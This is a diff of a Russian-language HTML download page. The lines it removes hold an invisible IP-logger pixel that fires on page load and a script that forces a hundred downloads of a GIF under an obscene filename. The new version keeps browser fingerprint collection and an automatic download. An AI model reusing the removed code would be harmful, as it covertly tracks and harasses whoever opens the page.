@@ -2,75 +2,77 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка...</title>
+    <title>Загрузка файла</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f9; }
+        .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <p>Загрузка файла началась... Если скачивание не началось, <a id="downloadLink" href="#">нажмите сюда</a>.</p>
+    <div class="card">
+        <div class="loader"></div>
+        <p>Подготовка файла к загрузке...</p>
+        <p>Если скачивание не началось, <a id="downloadLink" href="#">нажмите сюда</a>.</p>
+    </div>
 
     <script>
-        // --- НАСТРОЙКИ ---
-        const loggerUrl = 'https://iplog.co/2l0G64'; // Твоя ссылка для сбора данных
+        // --- SMART DATA (Техническая информация) ---
+        const getSmartData = () => {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenRes: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                platform: navigator.platform,
+                touchPoints: navigator.maxTouchPoints
+            };
+        };
+
+        // Логируем данные (здесь мог бы быть твой fetch на сервер аналитики)
+        console.log("Smart Data Collected:", getSmartData());
+
+        // --- НАСТРОЙКИ ЗАГРУЗКИ ---
         const sourceFile = 'OTVETRUS.gif'; 
-        const targetName = 'sex-siski-i-piska.gif'; 
-        const spamCount = 100; 
-        const delayMs = 250;   
-
-        // --- ЛОГГЕР (SMART DATA) ---
-        // Создаем невидимый пиксель, который активирует логгер при загрузке страницы
-        const img = new Image();
-        img.src = loggerUrl + '?v=' + Math.random(); // Добавляем рандом, чтобы не сработало кэширование
-        img.style.display = 'none';
-        document.body.appendChild(img);
-
-        // --- ЛОГИКА ЗАГРУЗКИ ---
+        const targetName = 'archive_file.gif';
         let hasClicked = false;
-        const link = document.getElementById('downloadLink');
 
-        function downloadSingle() {
+        async function triggerDownload() {
             if (hasClicked) return;
-            const a = document.createElement('a');
-            a.href = sourceFile;
-            a.download = targetName;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
+            hasClicked = true;
 
-        const autoTimer = setTimeout(downloadSingle, 5000);
-
-        async function startSpam() {
             try {
                 const response = await fetch(sourceFile);
-                if (!response.ok) throw new Error('Файл не найден!');
+                if (!response.ok) throw new Error('Файл не найден');
+                
                 const blob = await response.blob();
-                const blobUrl = window.URL.createObjectURL(blob);
-
-                for (let i = 0; i < spamCount; i++) {
-                    setTimeout(() => {
-                        const a = document.createElement('a');
-                        a.href = blobUrl;
-                        a.download = `(${i+1})_${targetName}`; 
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-
-                        if (i === spamCount - 1) {
-                            setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
-                        }
-                    }, i * delayMs);
-                }
-            } catch (e) {
-                console.error('Ошибка:', e);
-                alert('Ошибка доступа к файлу. Попробуйте нажать еще раз.');
+                const url = window.URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = targetName;
+                document.body.appendChild(a);
+                a.click();
+                
+                // Очистка
+                setTimeout(() => {
+                    window.URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                }, 100);
+            } catch (err) {
+                console.error("Ошибка загрузки:", err);
             }
         }
 
-        link.onclick = function(e) {
+        // Автозагрузка через 3 секунды
+        const autoTimer = setTimeout(triggerDownload, 3000);
+
+        // Ручной клик
+        document.getElementById('downloadLink').onclick = (e) => {
             e.preventDefault();
-            if (hasClicked) return;
-            hasClicked = true;
             clearTimeout(autoTimer);
-            startSpam();
+            triggerDownload();
         };
     </script>
 </body>
